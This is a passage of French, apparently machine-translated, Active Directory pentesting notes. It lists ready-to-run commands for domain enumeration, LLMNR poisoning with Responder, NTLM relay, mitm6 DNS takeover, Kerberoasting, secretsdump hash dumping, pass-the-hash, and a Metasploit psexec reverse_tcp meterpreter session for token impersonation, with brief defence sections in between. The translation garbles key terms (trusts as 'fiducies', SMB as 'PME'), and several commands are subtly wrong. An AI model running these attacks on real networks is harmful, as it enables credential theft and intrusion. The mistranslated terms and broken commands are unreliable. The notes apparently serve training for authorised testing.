<div align="center">
<h1> AD-Pentesting-Notes</h1>
</div>

**Les bases d'AD**
 - Domaines
   - Les domaines sont utilisés pour regrouper et gérer des objets dans une organisation
   - Une limite administrative pour appliquer des politiques à des groupes d'objets
   - Une limite d'authentification et d'autorisation qui permet de limiter la portée de l'accès aux ressources
 - Des arbres
   - Une arborescence de domaines est une hiérarchie de domaines dans AD DS
   - Tous les domaines de l'arborescence :
     - Partager un espace de noms contigu avec le domaine parent
     - Peut avoir des domaines enfants supplémentaires
     - Par défaut, créez une approbation transitive bidirectionnelle avec d'autres domaines

 - Les forêts
   - Une forêt est une collection d'un ou plusieurs arbres de domaine
   - Les forêts
     - Partager un schéma commun
     - Partager une partition de configuration commune
     - Partager un catalogue global commun pour permettre la recherche
     - Activer les approbations entre tous les domaines de la forêt
     - Partagez les groupes Enterprise Admins et Schema Admins

 - Unité organisationnelle (UO)
   - Les unités d'organisation sont des conteneurs Active Directory pouvant contenir des utilisateurs, des groupes, des ordinateurs et d'autres unités d'organisation.
   - Les UO servent à :
     - Représenter votre organisation de manière hiérarchique et logique
     - Gérer une collection d'objets de manière cohérente
     - Déléguer les autorisations pour administrer des groupes d'objets
     - Appliquer les politiques

 - Fiducies
   - Les fiducies fournissent un mécanisme permettant aux utilisateurs d'accéder aux ressources d'un autre domaine.
   - Types de fiducies
     - Directionnel : la direction de confiance circule du domaine de confiance vers le domaine de confiance
     - Transitive : La relation de confiance s'étend au-delà d'une confiance à deux domaines et inclut d'autres domaines de confiance.
   - Tous les domaines d'une forêt font confiance à tous les domaines de la forêt
   - Les fiducies peuvent s'étendre en dehors de la forêt

 - Objets
   - Utilisateur : Permet l'accès aux ressources réseau pour un utilisateur
   - InetOrgPerson : Similaire à un compte utilisateur, Utilisé pour la compatibilité avec d'autres services d'annuaire
   - Contacts : utilisé principalement pour attribuer des adresses e-mail à des utilisateurs externes, ne permet pas l'accès au réseau
   - Groupes : Utilisé pour simplifier l'administration du contrôle d'accès
   - Ordinateurs : permet l'authentification et l'audit de l'accès des ordinateurs aux ressources
   - Imprimantes : Utilisé pour simplifier le processus de localisation et de connexion aux imprimantes
   - Dossiers partagés : permettre aux utilisateurs de rechercher des dossiers partagés en fonction des propriétés
  
 - Un contrôleur de domaine est un serveur sur lequel le rôle de serveur AD DS est installé et qui a été spécifiquement promu contrôleur de domaine.
   - Héberger une copie du magasin d'annuaire AD DS
   - Fournir des services d'authentification et d'autorisation
   - Répliquez les mises à jour d'autres contrôles de domaine dans le domaine et la forêt
   - Autoriser l'accès administratif pour gérer les comptes d'utilisateurs et les ressources réseau
 - Un magasin de données AD DS (Active Directory Domain Service) contient le fichier de base de données et les processus qui stockent et gèrent les informations d'annuaire pour les utilisateurs, les services et les applications.
   - Se compose du fichier Ntds.dit
   - Est stocké par défaut dans le dossier `%SystemRoot%\NTDS` sur tous les contrôleurs de domaine.
   - Est accessible uniquement via les processus et protocoles du contrôleur de domaine.
   - `Si un AD DS est compromis, un attaquant peut obtenir tous les hachages de passwd des utilisateurs de ce domaine.` <br><br>
 - Composants logiques AD
   - Le schéma AD DS
     - Définit chaque type d'objet pouvant être stocké dans le répertoire
     - Applique les règles concernant la création et la configuration des objets
     - Objet de classe : Utilisateur, Ordinateur
     - Objet d'attribut : Nom d'affichage
  
 **Énumération de réseau - NMAP** <br>
   - Énumérer les ports
   - `nmap -Pn -p- IP -vv -oA nmap/all-ports`
   - Extraire les ports
   - `cat nmap/all-ports.nmap |  awk -F/ '/open/ {b=b","$1} END {print substr(b,2)}'`
   - Énumérer les services
   - `nmap --Pn sC -sV -oA nmap/services -p(ports) IP --script=vuln -vv`
   - Le contrôleur de domaine peut avoir un port ouvert comme ` 53,88,135,139,389,445,464,593,636,3268,3269,3389 `
   - Notez le nom de domaine complet, le nom de domaine DNS, le nom de l'ordinateur DNS et le nom de l'ordinateur avec leur adresse IP et leurs ports ouverts.
   - Nom de domaine complet : un nom de domaine complet (FQDN) est le nom de domaine complet d'un ordinateur ou d'un hôte spécifique sur Internet.  Le FQDN se compose de deux parties : le nom d'hôte et le nom de domaine.  Par exemple, un nom de domaine complet pour un serveur de messagerie hypothétique pourrait être mymail.somecollege.edu.  <br> <br>

 **Énumération du réseau - PME**
   - Répertoriez tous les scripts liés aux SMB sur NMAP.  `ls /usr/share/nmap/scripts/ |  grep smb`
   - `nmap -Pn --script smb-enum* -p139,445 IP |  tee smb-enumeration`
   - `nmap -Pn --script smb-vuln* -p139 445 IP |  tee smb-vulnerabilities`

   - Enumérations SMB avec smbmap : `smbmap -H IP`
   - Recherche récursive avec smbmap : `smbmap -R <Foldername> -H IP`
   - Énumération authentifiée avec smbmap : `smbmap -H IP -d <domainname> -u <username> -p <password>`

   - Enumérations SMB avec smbclient : `smbclient -L IP`
     - Essayez d'accéder au lecteur : `smbclient //IP/DriveName`
     - Avec authentification : `smbclient //IP/DriveName -U htb.local\\username%password` <br><br>
   
  
 **Énumération de domaine - ldapsearch**
 - Afficher les contextes de dénomination
 - `ldapsearch -x -H ldap://10.129.95.154 -s base namingcontexts`
 - [ldapsearch]() est un outil d'énumération de domaine qui ouvre une connexion à un serveur LDAP, se lie et effectue une recherche en utilisant les paramètres spécifiés.
 - `ldapsearch -x -b "dc=htb,dc=local" -h <IP> -p <port>`
 - L'indicateur -x est utilisé pour spécifier l'authentification anonyme, tandis que l'indicateur -b indique la base de départ.
 - Vider uniquement les utilisateurs utilisant ldapsearch
 - `ldapsearch -x -b "dc=htb,dc=local" -h <IP> -p 389 '(ObjectClass=User)' sAMAccountName |  grep sAMAAccountName |  awk '{print $2}'`
 - Vider uniquement les comptes de service`
 - `ldapsearch -x -b "dc=htb,dc=local" -h <IP> -p 389 |  grep -i -a 'Service Accounts'`
 - Vider les noms d'utilisateurs
 - `ldapsearch -H ldap://search.htb -x -D 'username@search.htb' -w "passwords" -b "DC=search,DC=htb" "objectclass=user" sAMAccountName |  grep sAMAAccountName |  awk -F": '{print $2}'`

 **Énumération de domaine - rpcclient**
 - RPC est un appel de procédure à distance (protocole) que le programme peut utiliser pour demander un service à un programme situé sur un autre ordinateur du réseau sans avoir à comprendre les détails du réseau.
 - Rpcclient nécessite des informations d'identification pour accéder mais dans certains cas, l'accès anonyme est autorisé.
 - Connectez-vous au contrôleur de domaine cible sans authentification
  - `rpcclient -U=" " -N <dc-ip>` : Appuyez sur Entrée dans la section mot de passe.
 - Connectez-vous au contrôleur de domaine cible avec authentification
  - `rpcclient -U="username" <dc-ip>` : Entrez le passwd dans la section mot de passe
 - Lister les commandes : `help`
 - Récupérer les informations du serveur : `srvinfo`
 - Énumérer les noms d'utilisateurs : `enumdomusers`
 - Interroger les utilisateurs particuliers : `queryuser <username>`
 - Répertoriez la politique de passwd de l'utilisateur particulier.  Pour cela, nous avons besoin du « débarras » de cet utilisateur particulier qui peut être obtenu par la requête ci-dessus
  - `getuserdompwinfo <rid>`
 - Commande de recherche de noms qui peut être utilisée pour rechercher des noms d'utilisateur sur le contrôleur de domaine.  Il peut également être utilisé pour extraire leur SID.
  - `lookupnames <username>`
 - Créer des utilisateurs de domaine
  - `createdomuser <username>`
 - Supprimer les utilisateurs du domaine
  - `deletedomuser <username>` 
 - Énumérer les domaines
  - `enumdomains`
 - Énumérer les groupes de domaines
  - `enumdomaingroups`
 - Requête de groupes de domaines : vous aurez besoin d'un débarras pour cela qui peut être obtenu par la commande ci-dessus.
  - `querygroup <rid>`
 - Interroger les informations d'affichage sur tous les utilisateurs d'un contrôleur de domaine
  - `querydispinfo`
 - Énumérer les partages PME
  - `netshareenum`
 - Énumérer les privilèges : `enumprivs`


 **Énumération de domaines - windapsearch**
 - [windapsearch](https://github.com/ropnop/windapsearch) est un script python pour énumérer les utilisateurs, les groupes et les ordinateurs du domaine Windows via LDAP.
 - Énumérer les utilisateurs sans informations d'identification
   - `python3 windapsearch -d <Nom de domaine> --dc-ip <IP du contrôleur de domaine> -U |  tee windapsearch-enumeration-users`
 - Énumérer les utilisateurs avec des informations d'identification
   - `python3 windapsearch -d <Nom de domaine> --dc-ip <IP du contrôleur de domaine> -u "domain\\username" -p "passwd" -U |  tee winapsearch-authenticated-enumerations`
 - Énumérer les groupes avec des informations d'identification
   - `python3 windapsearch -d <Nom de domaine> --dc-ip <IP du contrôleur de domaine> -u "domain\\username" -p "passwd" -G |  tee winapsearch-authentication-group-enumerations`
 - Énumérer les ordinateurs sans contrainte
   - `python3 windapsearch -d <Nom de domaine> --dc-ip <IP du contrôleur de domaine> -u "domain\\username" -p "password" --unconstrained-computers |  tee unconstrained-computers-enumeration`
   - Sans contrainte signifie que l'ordinateur pourra usurper l'identité de n'importe qui, s'il en a les moyens.  Nous pouvons connecter l'administrateur du domaine à cet ordinateur sans contrainte, à partir de là, nous pouvons nous faire passer pour l'administrateur du domaine.<br><br>

 **Énumération de domaine - LdapDomainDump**
 - [LdapDomainDump](https://github.com/dirkjanm/ldapdomaindump) est un outil pour énumérer les utilisateurs, les groupes et les ordinateurs.  Un meilleur outil que Windapsearch.
 - `python3 ldapdomaindump.py --user "domain\\user" -p "passwd" ldap://DomainControllerIP:389 --no-json --no-grep -o output`
 - Le résultat peut être vu dans le répertoire de sortie.  Créez un répertoire de sortie avant d'exécuter les commandes ci-dessus.
 - Visualisation du dump avec une jolie sortie comme enum4linux
 - `ldapdomaindump --user "search.htb\user" -p "passwd" ldap://search.htb:389 -o output`
 - `ldd2pretty --directory output` <br><br>

 **Énumération de domaine - Énumération avec Enum4Linux**
 - Cas d'utilisation
   - Cyclage RID (lorsque RestrictAnonymous est défini sur 1 sous Windows 2000) 
   - Liste des utilisateurs (lorsque RestrictAnonymous est défini sur 0 sous Windows 2000)
   - Liste des informations sur l'adhésion au groupe.
   - Partager l'énumération
   - Détecter si l'hôte est dans un groupe de travail ou un domaine
   - Identification du système d'exploitation distant
   - Récupération de la politique de passwd (à l'aide de polenum)
 - L'option Tout faire
   - `enum4linux -a <IP>`.  Ici, l'IP est le contrôleur de domaine
 - L'option Tout faire avec authentification
   - `enum4linux -u username -p passwd -a <IP>`
 - Liste des noms d'utilisateurs
   - `enum4linux -U <IP>`
 - Liste des noms d'utilisateur avec authentification
   - `enum4linux -u username -p passwd -U <IP>`
 - Appartenance à un groupe
   - `enum4linux -G IP`
 - Informations sur le groupe nbtstat
   - `enum4linux -n IP`
 - Liste des partages Windows
   - `enum4linux -S IP`
 - Obtenir des informations sur l'imprimante
   - `enum4linux -i iP`
 - Notez les informations de domaine telles que les noms de domaine, les utilisateurs et les mots de passe, l'identifiant du domaine <br><br>

 **Générer des noms d'utilisateur à partir du prénom et du nom**
 ```bash
 curl https://gist.githubusercontent.com/dzmitry-savitski/65c249051e54a8a4f17a534d311ab3d4/raw/5514e8b23e52cac8534cc3fdfbeb61cbb351411c/user-name-rules.txt >> /etc/john/john.conf
 john --wordlist=fullnames.txt --rules=Login-Generator-i --stdout > usernames.txt
 ```
 **Énumération de domaine : énumérez les utilisateurs avec Kerbrute**
 ```bash
 ./kerbrute_linux_amd64 userenum --dc 10.10.11.129 -d search.htb ~/htb/search/usernames.txt
 ```

 **Utilisateurs NMAP d'énumération de domaine**
 - Utilisation de LDAP
   - `nmap -p389 --script ldap-search --script-args 'ldap.username="cn=ippsec,cn=users,dc=pentesting,dc=local",ldap.password=Password12345,ldap.qfilter=users ,ldap.attrib=sAMAccountName' <IP> -Pn -oA nmap/domain-users`
   - Où nom de domaine = pentestig.local, username=ippsec, password=Password12345.
   - Il listera tous les utilisateurs disponibles sur le domaine.
   - Pour énumérer les groupes, remplacez `cn=users` par `cn=groups` et `ldap.qfilter=users` par `ldap.qfilter=groups` à partir des commandes ci-dessus<br><br>
 - Utilisation de Kerberos
   - `nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='pentesting.local' <IP> -Pn` -> Énumération anonyme <br><br>
  
 **Énumération de domaine GetADUsers.py**
 - Un script python développé par impacket pour énumérer les utilisateurs du domaine.  [Télécharger](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py)
 - `python3 GetADUsers.py -all pentesting.local/ippsec:Password12345 -dc-ip 192.168.10.50`
 - Où pentesting.local est le nom de domaine, ippsec et Password12345 sont les informations d'identification du contrôleur de domaine 192.168.10.50
 - D'autres outils ont développé mon impacket [ici](https://github.com/SecureAuthCorp/impacket/tree/master/examples).

 - Rechercher des délégations : la délégation AD est un élément essentiel de la sécurité et de la conformité.  En déléguant le contrôle sur Active Directory, vous pouvez accorder aux utilisateurs ou aux groupes les autorisations dont ils ont besoin sans ajouter d'utilisateurs à des groupes privilégiés tels que les administrateurs de domaine et les opérateurs de compte.
   - `python3 findDelegation.py -dc-ip 192.168.1.50 pentesting.local/ippsec:Password12345` - Téléchargez le fichier depuis [ici](https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py ).  <br><br>

 **Empoisonnement LLMNR**
 - LLMNR : Link Local Multicast Name Resolution (LLMNR) est un protocole basé sur le format de paquet DNS (Domain Name System) qui permet aux hôtes IPv4 et IPv6 d'effectuer une résolution de nom pour les hôtes sur la même liaison locale.
 - Utilisé pour identifier quand DNS fils doit le faire.
 - Auparavant NBT-NS
 - Le principal défaut est que les services utilisent le username et le hachage NTLMv2 d'un utilisateur lorsqu'ils répondent de manière appropriée.
 - Le positionnement LLMNR est effectué via un outil appelé [Responder](https://github.com/SpiderLabs/Responder).  Répondez à un outil qui s'exécute tôt le matin lorsque les utilisateurs se connectent au réseau ou après l'heure de lancement.
 - Syntaxe : `python Responder.py -I <interface> -rdw`
 - Une fois l'événement déclenché, le répondeur capturera l'adresse IP, le username et le hachage NTLMv2 de la victime. <br><br>

 **Capture des hachages NTLMv2 avec le répondeur**
 - `responder -I eth0 -rdwv |  tee responderHash.txt` <br><br>

 **Craquage de passwd avec Hashcat**
 - [Hashcat](https://github.com/hashcat/hashcat) est un outil utilisé pour cracker les hachages sur différents modules
 - Copiez les hachages collectés auprès du répondeur.  Exemple
 - `echo "admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0 000000052920b85f78d013c31cdb3b92f5d765c783030" > hash.txt`
 - `hashcat -m 5600 hash.txt /path/to/wordlist.txt`
 - Où m est un module et 5600 est un module pour NTLMv2 <br><br>

 **Défense contre l'empoisonnement LLMNR**
 - Désactiver LLMNR et NBT-NS
   - Pour désactiver LLMNR, sélectionnez « Désactiver la résolution de nom de multidiffusion » sous Stratégie de l'ordinateur local > Configuration de l'ordinateur > Modèles d'administration > Réseau > Client DNS dans l'éditeur de stratégie de groupe.
   - Pour désactiver NBT-NS, accédez à Connexions réseau > Propriétés de la carte réseau > Propriétés TCP/IPv4 > onglet Avancé > onglet WINS et sélectionnez « Désactiver NetBIOS sur ICP/IP ».
 - Si une entreprise doit utiliser ou ne peut pas désactiver LLMNR/NBT-NS, la meilleure solution est de :
   - Exiger un contrôle d'accès au réseau.  Exemple, liaison MAC ou sécurité en mode switchport afin qu'un périphérique attaquant ne puisse pas se connecter au réseau.
   - Exiger des mots de passe utilisateur forts (par exemple, > 14 caractères et limiter l'usage courant).<br><br>
  
 **Présentation du relais PME**
 - Au lieu de déchiffrer les hachages collectés avec Responder, nous pouvons relayer ces hachages vers des machines spécifiques et potentiellement y accéder.
 - Exigences
   - La signature SMB doit être désactivée sur la cible
   - Les informations d'identification de l'utilisateur relu doivent être celles de l'administrateur sur la machine
     - Récupérez le hachage NTLM d'une machine et relayez ce hachage NTLM vers une autre machine comme spécifié sur ntlmrelayx.  Par conséquent, au moins deux machines doivent être présentes pour effectuer le relais.
 - Étape 1
   - Découvrez les hôtes avec la signature SMB désactivée
     - `nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24`
     - Si le résultat est La signature des messages activée mais pas obligatoire, nous pouvons également effectuer une attaque.
 - Étape 2
   - Ajoutez les IP avec la signature SMB désactivée sur le fichier Targets.txt.
 - Étape 3
   - Ouvrez le fichier de configuration du répondeur et désactivez SMB et HTTP.  `vim /usr/share/responder/Responder.conf` ou `vim /etc/responder/Responder.conf`
   - Nous écouterons mais ne répondrons pas
 - Étape 4
   - Exécuter le répondeur : `python Responder.py -I eth0 -rdwv`
 - Étape 5
   - Exécutez [NTLMrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py).  `python ntlmrelayx.py -tf cibles.txt -smb2support`
   - Il prend le relais et le transmet au fichier cible que vous spécifiez.  -smb2support : intégrez également n'importe quoi avec SMB.
   - Attendez qu'un événement se déclenche
 - Étape 6 : Gagner
   - Il relaie les informations d'identification qu'il capture vers cette autre machine.  Il listera les fichiers SAM (identiques au fichier /etc/shadow sous Linux)
   - Nous pouvons déchiffrer ces hachages pour obtenir les mots de passe ou nous pouvons également transmettre ces hachages pour accéder à d'autres machines.
 - Etape 7 : Post Exploitation
   - Exécutez le répondeur comme avant
   - Exécutez NTLMRelayx en mode interactif
     - `python ntlmrelayx.py -tf targets.txt -smb2support -i` 
   - Configurer un auditeur
     - `nc 127.0.0.1 <portnumber>` Le numéro de port peut être obtenu à partir du résultat de ntlmrelayx
     - `help` : Ici nous avons gagné le shell SMB
     - Liste des partages : `shares`
     - `Use C$`
     - `ls`
     - Nous pouvons avoir un accès complet sur l'ordinateur comme nous pouvons ajouter un fichier, lire un fichier
   - Nous pouvons également configurer un écouteur de compteur
     - `python ntlmrelayx.py -tf cibles.txt -smb2support -e test.exe` où test.exe est une charge utile de compteur (exécutable)
   - Exécute certaines commandes spécifiques
     - `python ntlmrelayx.py -tf cibles.txt -smb2support -c "whoami"` 
   - Obtenir un shell avec [psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
     - `python3 psexec.py marvel.local/fcastle:Password1@<ip>` <br><br>

 **Relais PME en défense**
 - Activer la signature SMB sur tous les appareils (meilleure solution)
   - Pro : Arrête complètement l'attaque
   - Inconvénient : Peut entraîner des problèmes de performances avec les copies de fichiers
 - Désactiver l'authentification NTLM sur le réseau
   - Pro : Arrête complètement l'attaque
   - Inconvénient : Si Kerberos cesse de fonctionner, Windows revient par défaut à NTLM
 - Hiérarchisation des comptes :
   - Pro : limite les administrateurs de domaine à des tâches spécifiques (par exemple, connectez-vous uniquement aux serveurs nécessitant DA)
   - Inconvénient : l'application de la politique peut être difficile
 - Restriction de l'administrateur local (meilleure solution)
   - Pro : Peut empêcher beaucoup de mouvements latéraux
   - Inconvénient : Augmentation potentielle du nombre de tickets du service desk <br><br>
 
 **Attaques IPv6**
 - Attaque de prise de contrôle DNS via IPv6
 - Il s'agit d'une autre forme d'attaque par relais, mais elle est d'autant plus fiable qu'elle utilise IPv6.
 - La plupart du temps, IPv6 est activé, mais seul IPv4 est utilisé.
 - Si IPv4 est utilisé, qui fait du DNS pour IPv6 et du DNS en IPv6 manque sur la plupart des ordinateurs.
 - Un attaquant peut configurer une machine et écouter tous les messages IPv6 qui transitent.  (JE SUIS VOTRE DNS)
 - Nous pouvons également obtenir une authentification auprès du contrôleur de domaine lorsque cela se produit
 - Nous pouvons effectuer cette attaque avec [mitm6](https://github.com/dirkjanm/mitm6)

 **Reprise DNS IPv6 via mitm6**
 - `mitm6 -d marvel.local` Continuez à fonctionner
 - Configurer une attaque relais `ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme`
 - Où -6 est pour IPv6, 192.168.57.140 est un contrôleur de domaine et -l pour le butin pour récupérer plus d'informations
 - Scénario : IPv6 envoie une réponse et indique qui a mon DNS et il l'envoie toutes les 30 minutes
 - Plus de détails sur [mitm6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
 - Plus de détails sur [Combiner les relais NTLM et la délégation Kerberos](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) <br><br>

 **Défense contre les attaques IPv6**
 - L'empoisonnement IPv6 abuse du fait que Windows demande une adresse IPv6 même dans des environnements uniquement IPv4.  Si vous n'utilisez pas IPv6 en interne, le moyen le plus sûr d'empêcher mitm6 est de bloquer le trafic DHCPv6 et les publicités de routeur entrantes dans le pare-feu Windows via la stratégie de groupe.  La désactivation complète d'IPv6 peut avoir des effets secondaires indésirables.  Définir les règles prédéfinies suivantes sur Bloquer au lieu d'Autoriser empêche l'attaque de fonctionner :
   - Réseau central (entrant) - Protocole de configuration d'hôte dynamique pour IPv6 (DHCPV6-In)
   - (Ibound) Core Networking - Publicité ROuter (ICMPv6-In)
   - Réseau central (sortant) - Protocole de configuration d'hôte dynamique pour IPv6 (DHCPV6-Out)
 - Si WPAD n'est pas utilisé en interne, désactivez-le via la stratégie de groupe et en désactivant le service WinHttpAutoProxySvc.
 - Le relais vers LDAP et LDAPS ne peut être atténué qu'en activant la signature LDAP et la liaison de canal LDAP.
 - Envisagez d'ajouter les utilisateurs administratifs au groupe Utilisateurs protégés ou de les marquer comme compte sensible et ne peut pas être délégué, ce qui empêchera toute usurpation d'identité de cette utilisation via la délégation.<br><br>

 **GetNPUsers et pré-autorisation Kerberos**
 - Répertoriez les utilisateurs pour lesquels la pré-authentification Kerberos est désactivée.
 - `python3 getnpusers.py htb.local/ -dc-ip 192.168.170.115`
 - Récupérez le HASH des utilisateurs répertoriés
 - `python3 getnpusers.py htb.local/ dc-ip 192.168.170.115 -request`
 - Avec authentification
 - `impacket-GetNPUsers 'search.htb/user:password' -usersfile usernames.txt -dc-ip 'search.htb'`


 **Énumération après compromission AD**
 - Énumération de domaine avec [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
   - Powerview est un outil qui nous permet d'examiner le réseau et d'énumérer essentiellement le contrôleur de domaine, la politique de domaine, le groupe d'utilisateurs, etc.
   - Téléchargez le script PowerView ci-dessus.
   - `powershell -ep bypass`
   - Où, le contournement est une politique d'exécution et cela supprime le blocage de l'exécution du script.
   - Exécutez le programme `.  .\PoweView.ps1`
   - Obtenir des informations sur le domaine `Get-NetDomain`
   - Obtenez des contrôleurs de domaine spécifiques - `Get-NetDomainController`
   - Obtenir la politique de domaine - `Get-DomainPolicy`
   - Obtenez une politique spécifique comme l'accès au système - `(Get-DomainPolicy)."system access"`
   - Obtenez les utilisateurs - `Get-NetUser`
   - Récupérer la liste des utilisateurs - `Get-NetUser | select cn`
   - Obtenir les administrateurs du domaine - `Get-NetGroup -GroupName "Domain Admins"`
   - Liste tous les fichiers partagés sur le réseau - `Invoke-ShareFinder`
   - [Aide-mémoire Powerview](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 - Aperçu et configuration de Bloodhound
   - `sudo apt install bloodhound`
   - Il fonctionne sur un outil appelé neo4j
   - `neo4j console` - Créez un nouveau passwd.
   - 'chien de sang'
 - Récupérer des données avec Invoke-Bloodhound
   - Téléchargez le script [sharphound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1).
   - Déplacez le fichier sur le PC victime compromis.
   - Activer l'exécution `powershell -ep bypass`
   - Exécutez le script `.  .\SharpHound.ps1`
   - Exécutez le script `Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip`
   - Toutes les données sont collectées sur le fichier zip.
   - Déplacer le fichier sur une machine attaquante.
   - Cliquez sur les données de téléchargement et téléchargez le fichier zip

 **Attaques post-compromission AD**
 - Passez l'aperçu du hachage/passwd
   - Si nous déchiffrons un passwd et/ou pouvons supprimer les hachages SAM, nous pouvons exploiter les deux pour les mouvements latéraux dans les réseaux.
   - Passez le passwd : `crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>`
 - Dumping des hachages avec [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
   - Il fait également partie des outils impacket
   - `secretsdump.py marvel/fcastle:Password1@<ip>`
   - Il sauvegarde les hachages SAM, la clé API DP ainsi que les secrets LSA
   - S'il y a une réutilisation du passwd, le dernier bit du hachage sera le même
 - Cracker les hachages NTLM avec Hashcat
   - `hashcat -m 1000 hashes.txt wordlist.txt -O`
 - Réussissez les attaques de hachage (Pass the Hash)
   - Passez le hachage (Pass the Hash), capturez le dernier bit du hachage avec psexec hashdump : `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local`
 - Atténuation des attaques de passes (Pass the Hash)
   - Difficile de l'empêcher complètement, mais nous pouvons rendre la tâche plus difficile à un attaquant.
   - Limiter la réutilisation des comptes
     - Évitez de réutiliser le passwd de l'administrateur local
     - Désactiver les comptes Invité et Administrateur
     - Limiter qui est un administrateur local (moindre privilège)
   - Utilisez des mots de passe forts
     - Plus c'est long, mieux c'est (> 14 caractères)
     - Évitez d'utiliser des mots courants
     - J'aime les longues phrases
   - Gestion des accès privilèges (PAM)
     - Extraire/ouvrir des comptes sensibles en cas de besoin.
     - Faites pivoter automatiquement les mots de passe au moment du départ et de l'enregistrement
     - Limite les attaques par passes car le hachage/passwd est fort et constamment en rotation.

 **Aperçu de l'usurpation d'identité de jeton**
 - Jetons : Clés temporaires qui vous permettent d'accéder à un système/réseau sans avoir à fournir d'informations d'identification à chaque fois que vous accédez à un fichier.  Pensez aux cookies pour les ordinateurs.
 - Les types
   - Délégué : Créé pour se connecter à une machine ou utiliser Remote Desktop
   - Usurpation d'identité : "non interactif" comme la connexion d'un lecteur réseau ou d'un script de connexion à un domaine

 **Usurpation d'identité de jeton avec Incognito**
   - `msfconsole`
   - `use exploit/windows/smb/psexec`
   - `set RHOSTS, SMBDomain, SMBPass and SMB User`
   - `show targets` : Choisissez Native Upload
   - `set target 2`
   - `set payload windows/x64/meterpreter/reverse_tcp`
   - `set lhost eth0`
   - `run`
 - Une session Meterpreter sera créée.  Nous pouvons charger incognito à partir du shell Meterpreter.
   - `load incognito`
   - `help` - Il affichera la commande incognito
   - `list_tokens -u` : Liste les jetons, nous pouvons usurper l'identité des utilisateurs répertoriés.
   - `impersonate_token marvel\\administrator`
   - `shell`
   - `whoami`

 **Stratégies d'atténuation**
 - Limiter les autorisations de création de jetons d'utilisateur/groupe
 - Hiérarchisation des comptes : l'administrateur de domaine doit se connecter aux machines auxquelles il doit accéder et qui ne doivent être que des contrôleurs de domaine.  Si, pour certaines raisons, cet administrateur de domaine se connecte à un ordinateur utilisateur ou à un serveur et que cet ordinateur ou serveur utilisateur est compromis.  Nous pouvons usurper l'identité de ce jeton si nous parvenons à compromettre le contrôleur de domaine.
 - Restriction de l'administrateur local : si les utilisateurs ne sont pas des administrateurs locaux sur leur ordinateur, nous ne pouvons pas obtenir de shell sur cet ordinateur avec leur compte qui nous empêche d'accéder à l'ordinateur et d'utiliser ce type d'attaque.


 **Présentation de Kerberos**
 - Kerberos est un protocole d'authentification réseau utilisé dans Windows Active Directory.
 - Dans ce processus, les clients se connectent et interagissent avec le service d'authentification réseau, le client obtient des tickets du centre de distribution de clés (KDC). Après avoir obtenu le ticket du KDC, un client peut utiliser le ticket afin de communiquer avec les serveurs d'applications. .
 - Kerberos s'exécute sur le port 88 (UDP) par défaut.
 - Quelques termes à clarifier :
   - Client : Un utilisateur normal qui souhaite accéder à un service.
   - Centre de distribution de clés (KDC) : Le composant le plus important qui joue le rôle principal dans le processus d'authentification.
   - Serveur d'applications : Tout service d'application tel que SQL
   - TGT (Ticket Granting Ticket) : Ticket nécessaire à la demande de TGS auprès du KDC, il s'obtient auprès du KDC uniquement.
   - TGS (Ticket Granting Service) : Ticket nécessaire à l'authentification auprès d'un service particulier qui est le hachage de compte serveur.
   - SPN (Service Principe Name) : SPN est un identifiant pour chaque instance de service, c'est l'un des composants clés dans le processus d'authentification.

   **Kerberasting**
   - Kerberoasting est une attaque dans laquelle un attaquant peut voler le ticket Kerberos TGS qui est crypté.
   - L'attaquant peut alors tenter de le cracker hors ligne.  Le Kerberos utilise un hachage NTLM afin de chiffrer le KRB_TGS de ce service.
   - Lorsque l'utilisateur du domaine envoie une demande de ticket TGS au KDC pour tout service ayant enregistré un SPN, le KDC génère le KRB_TGS sans identifier l'autorisation de l'utilisateur pour le service demandé.
 - Étape 1 : Obtenir les SPN, vider le hachage
	 - `python3 GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip du DC> -request`
	 - Étape 2 : Crackez ce hachage
		 - `hashcat -m 13100 hash.txt liste de mots.txt`
 - Étape 2 : Il existe une option pour qu'un compte ait la propriété « Ne nécessite pas de pré-authentification Kerberos » ou UF_DONT_REQUIRE_PREAUTH définie sur true.  AS-REP Roasting est une attaque contre Kerberos pour ces comptes.  Si tel est le cas, nous pouvons effectuer l'attaque sans passwd.
  - `python3 GetUserSPNs.py <DOMAINE/username> -dc-ip <IP> -request -no-pass`
 - S'il y a plusieurs utilisateurs qui doivent être essayés sans passwd, alors,
  - `for i in $(cat users.txt); do python3 GetNPUsers.py htb.local/$i -dc-ip 10.129.129.128 -no-pass -request; done`

 **Stratégies d'atténuation**
 - Mots de passe forts
 - Moindre privilège : Ne faites pas de vos comptes de domaine ou de services vos administrateurs de domaine.

 **Attaques GPP/cPassword**
 - Les préférences de stratégie de groupe permettaient aux administrateurs de créer des stratégies à l'aide d'informations d'identification intégrées.
 - Ces identifiants ont été cryptés et placés dans un "cPassword"
 - La clé a été accidentellement libérée
 - Patché dans MS14-025, mais n'empêche pas les utilisations précédentes.
 - Les stratégies de groupe sont stockées dans SYSVOL sur le contrôleur de domaine, tout utilisateur du domaine peut lire la stratégie et donc décrypter les mots de passe stockés.
 - Le GPP ou cpassword est stocké dans le fichier Groups.xml
 - Décrypter GPP : `gpp-decrypt <hash>`

 **Attaque de synchronisation DC (DC Sync)**
